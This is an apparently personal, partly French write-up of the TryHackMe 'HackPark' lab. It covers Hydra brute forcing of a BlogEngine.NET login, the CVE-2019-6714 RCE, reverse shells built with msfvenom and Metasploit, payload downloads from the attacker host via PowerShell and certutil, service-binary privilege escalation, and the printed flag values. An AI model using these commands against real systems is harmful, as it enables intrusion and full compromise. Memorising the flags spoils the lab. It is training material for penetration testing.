# HackPark

> Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

https://tryhackme.com/room/hackpark


10.10.4.18


Brute forcing with Hydra

Name of the clown : Pennywise

https://tineye.com


<form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
<input name="ctl00$MainContent$LoginUser$UserName" type="text" id="UserName" class="textEntry ltr-dir" />
<input name="ctl00$MainContent$LoginUser$Password" type="password" id="Password" class="passwordEntry ltr-dir" />


__VIEWSTATE=VONuS4qgtTqO8XE3V9OmRJIL5nfSzpal4XScbr8eUMj93ZW%2FERAk2VBHw%2B7g4fproUfMR0baI8D1OpVVAvCIcpPW%2FEZ5yZkHW8ejq1XvpqvU0PBSVCh8%2Fsd1Rrm8ErOT61hvRVeyglvlwr%2BOkNMIdK1JPW2yM03MOQsYxood64nMmE37l0T%2FX53vBIYLlW4zWeU8fdKDkAQd73iDnAlle94j839sst08jr7SBzdIejSzaePrAmlkwIrjPm1QlLLI2%2F9HCx17l4%2BrRc%2BTVV0TigCwHEN6AD67XJnHzpjLBX7BGxwlgo5RwUb0DLkEOkWGLSZWHp94Mg1UUDDLDDripwHXzuXQmIAum6pqN%2F0n2Wzf5Ngf&__EVENTVALIDATION=P4FLwWdgiB0Fyi14qTO2P6nQTj%2B%2FW99PPoHj%2Bodf5XQhP%2Fo3nlXcggU1rGi1%2Fp4pJzoaiAbbfnAtYjeyXHv%2F8G5BGavygh00rv142uGHsTuIaw7MIrATDaG3C3XJq9RygQv5trehheWQFdJPps0O7OFuB0%2B9FIWJbyW4V5Of82bnkT2%2B&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in


Layout of command: hydra -L <USER> -P <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”


hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.4.18 http-post-form "/Account/login.aspx:ctl00$MainContent$LoginUser$UserName=^USER^&tl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Login failed"


hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.4.18 http-post-form "/Account/login.aspx:__VIEWSTATE=VONuS4qgtTqO8XE3V9OmRJIL5nfSzpal4XScbr8eUMj93ZW%2FERAk2VBHw%2B7g4fproUfMR0baI8D1OpVVAvCIcpPW%2FEZ5yZkHW8ejq1XvpqvU0PBSVCh8%2Fsd1Rrm8ErOT61hvRVeyglvlwr%2BOkNMIdK1JPW2yM03MOQsYxood64nMmE37l0T%2FX53vBIYLlW4zWeU8fdKDkAQd73iDnAlle94j839sst08jr7SBzdIejSzaePrAmlkwIrjPm1QlLLI2%2F9HCx17l4%2BrRc%2BTVV0TigCwHEN6AD67XJnHzpjLBX7BGxwlgo5RwUb0DLkEOkWGLSZWHp94Mg1UUDDLDDripwHXzuXQmIAum6pqN%2F0n2Wzf5Ngf&__EVENTVALIDATION=P4FLwWdgiB0Fyi14qTO2P6nQTj%2B%2FW99PPoHj%2Bodf5XQhP%2Fo3nlXcggU1rGi1%2Fp4pJzoaiAbbfnAtYjeyXHv%2F8G5BGavygh00rv142uGHsTuIaw7MIrATDaG3C3XJq9RygQv5trehheWQFdJPps0O7OFuB0%2B9FIWJbyW4V5Of82bnkT2%2B&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"



http://10.10.4.18/Account/login.aspx


[80][http-post-form] host: 10.10.4.18   login: admin   password: 1qaz2wsx

BlogEngine.NET v3.3.6.0

https://www.exploit-db.com/exploits/46353

# Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
# Date: 02-11-2019
# Exploit Author: Dustin Cobb
# Vendor Homepage: https://github.com/rxtur/BlogEngine.NET/
# Software Link: https://github.com/rxtur/BlogEngine.NET/releases/download/v3.3.6.0/3360.zip
# Version: <= 3.3.6
# Tested on: Windows 2016 Standard / IIS 10.0
# CVE : CVE-2019-6714


/admin/app/editor/editpost.cshtml

Création du fichier PostView.ascx avec l'IP/PORT

Upload du fichier PostView.ascx : OK

Execution de l'exploit via l'appel à l'url `/?theme=../../App_Data/files` : OK, Got shell

c:\windows\system32\inetsrv>whoami
iis apppool\blog

Tentative d'envoi du shell + exec via powershell : FAIL

```
powershell -c Invoke-WebRequest -Uri http://10.9.28.128/meter.exe -OutFile meter.exe
powershell -c Start-Process "meter.exe"
```

Upload de l'exe via l'interface web : OK

../../App_Data/files => c:\inetpub\wwwroot

Préparation du reverse shell dans metasploit : OK

```msf5
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.9.28.128
set LPORT 9002
run
```

Execution manuelle : OK

```
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

```ps1
c:\inetpub\wwwroot\App_Data\files>powershell -c Get-Service 

Status   Name               DisplayName                           
------   ----               -----------                           
R(...)     
Running  WindowsScheduler   System Scheduler Service              
```

```ps1
powershell -c "Get-WmiObject win32_service | ?{$_.Name -like 'WindowsScheduler'} | select Name, PathName"

Name                                    PathName                               
----                                    --------                               
WindowsScheduler                        C:\PROGRA~2\SYSTEM~1\WService.exe  
```


PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] SERVICES VULNERABILITIES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] SERVICE BINARY PERMISSIONS WITH WMIC + ICACLS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe NT AUTHORITY\SYSTEM:(I)(F)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)
C:\Program Files\Amazon\XenTools\LiteAgent.exe NT AUTHORITY\SYSTEM:(I)(F)
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe NT AUTHORITY\SYSTEM:(I)(F)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)

_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] AppCmd <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
C:\Windows\system32\inetsrv\appcmd.exe exists. 


WindowsScheduler.exe


https://www.exploit-db.com/exploits/45072





On utilise `msfvenom` pour créer un nouveau reverse shell (9003)

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.28.128 LPORT=9003 -e x86/shikata_ga_nai -f exe -o wservice.exe
```

upload du nouveau shell : OK

Préparation du reverse shell : 


```msf5
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.9.28.128
set LPORT 9003
run
```

ren Message.exe Message.bak
ren mp9003.exe Message.exe


03/25/2018  10:58 AM           536,992 Message.exe
05/03/2020  01:25 PM            73,802 mp9003.exe



## 

```
c:\windows\system32\inetsrv>systeminfo

Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard Evaluation
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-10000-00000-AA228
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          6/21/2020, 10:19:48 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 3,175 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 4,469 MB
Virtual Memory: In Use:    1,035 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB2919355
                           [02]: KB2919442
                           [03]: KB2937220
                           [04]: KB2938772
                           [05]: KB2939471
                           [06]: KB2949621
                           [07]: KB3035131
                           [08]: KB3060716
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.129.174
                                 [02]: fe80::419b:97d2:3d33:cdb5
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```


On utilise `msfvenom` pour créer un nouveau reverse shell

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.11.184 LPORT=7777 -f exe -o Message.exe
```

Démarrage du serveur web local

Démarrage du netcat dur le port 7777

Upload du binaire généré.

> https://lolbas-project.github.io/lolbas/Binaries/Certutil/

```
cd C:\PROGRA~2\SYSTEM~1\
certutil.exe -urlcache -split -f http://10.9.11.184/Message.exe
```


```
C:\PROGRA~2>whoami
whoami
hackpark\administrator
```

```
C:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
```

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
```

```
C:\Windows\Temp -c "Invoke-WebRequest -Uri 'http://10.9.11.184/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
```

```
Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard Evaluation
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-10000-00000-AA228
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          6/21/2020, 10:19:48 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
```